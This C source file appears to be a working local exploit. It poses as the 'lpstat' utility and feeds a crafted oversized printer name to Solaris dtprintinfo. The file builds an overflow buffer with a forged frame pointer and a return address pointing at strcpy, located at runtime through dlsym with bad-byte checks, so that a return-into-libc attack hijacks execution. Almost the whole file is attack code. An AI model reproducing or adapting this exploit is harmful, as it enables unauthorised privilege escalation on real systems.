#include <stdio.h>
#include <dlfcn.h>
#define SIZE 290

void
usage()
{
 fprintf(stderr,"called with no arguments\n");
 exit(-1);
}

unsigned long
getlong(char * c)
{
 unsigned long bob;
 sscanf(c,"%lx",&bob);
 return bob;
}

int
check_for_bad_byte(unsigned long check, unsigned char badbyte)
{
  unsigned char bob;

 bob=(unsigned char)(check & 0xff);
  if (bob == badbyte)
    return 1;
  bob=(unsigned char)((check >> 8) & 0xff);
  if (bob == badbyte)
    return 1;
  bob=(unsigned char)((check >> 16) & 0xff);
  if (bob == badbyte)
    return 1;
  bob=(unsigned char)((check >> 24) & 0xff);
  if (bob == badbyte)
    return 1;

  return 0;

}

int
check_for_bad_bytes(unsigned long check)
{
  unsigned char badbytes[] = {0x00,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f};
  int i;

  for (i=0; i< sizeof(badbytes); i++)
   {
    if (check_for_bad_byte(check,badbytes[i]))
        return 1;

   }

  return 0;
}

unsigned long
get_good_place_to_return()
{
  void *handle;
  unsigned long dlfunction_addr;

  if (!(handle=dlopen(NULL,RTLD_LAZY)))
    {
      fprintf(stderr,"Can't dlopen myself!\n");
        exit(1);
    }

  if ((dlfunction_addr=(long)dlsym(handle,"strcpy"))==NULL)
    {
      fprintf(stderr,"Can't find %s().\n","strcpy");
      dlfunction_addr=0;
    }


   if (check_for_bad_bytes(dlfunction_addr))
        {
         /*we need to see if strcpy exists instead*/
         if ((dlfunction_addr=(long)dlsym(handle,"strccpy"))==NULL)
         {
           fprintf(stderr,"Can't find %s().\n","strccpy");
           dlfunction_addr=0;
         }
         if (check_for_bad_bytes(dlfunction_addr) )
           {
              printf("Couldn't locate strcpy or strccpy.\n");
              exit(1);
           }
        }
    return dlfunction_addr;
}


int 
main(int argc,char **argv) {
 
char name[SIZE];   /* printer name */ 
long dlfunction_addr;

dlfunction_addr=get_good_place_to_return();
/*printf("dlfunction_addr=%x\n",dlfunction_addr); this keeps lpstat from working..debug only */

memset(name,0x00,sizeof(name)); /*clear with zeros*/
memset(name,0x41,SIZE);
memset(name+233,0x42,SIZE-233);

/*frame pointer.  send to FRM (0x43's) because we're dying on ret in some dtprintinfo function. we go to dtprintex.c to set up our bogus frame now*/
name[228]=0xff;
name[229]=0xbe;
name[230]=0xdd;
name[231]=0xc0;

/* 0xfecb2604 strcpy 
name[232]=0xfe;
name[233]=0xcb;
name[234]=0x26;
name[235]=0x04;
*/
name[232]=(dlfunction_addr >> 24)    & 0xff;
name[233]=(dlfunction_addr >> 16)    & 0xff;
name[234]=(dlfunction_addr >> 8) & 0xff;
name[235]=(dlfunction_addr >> 0) & 0xff;

/* i0 first time set for cont.of.exec. 0xffbe32e8 */
name[204]=0xff;
name[205]=0xbe;
name[206]=0x32;
name[207]=0xe8;


name[SIZE-1]=0;

if(argc<2) {
  usage();
}

if(!strcmp(argv[1],"-v"))
{
   fprintf(stderr,"lpstat called with -v\n");
   printf("device for %s: /dev/null\n",name);
}
else
{
   fprintf(stderr,"lpstat called with -d\n");
   printf("system default destination: %s\n",name);
}

}
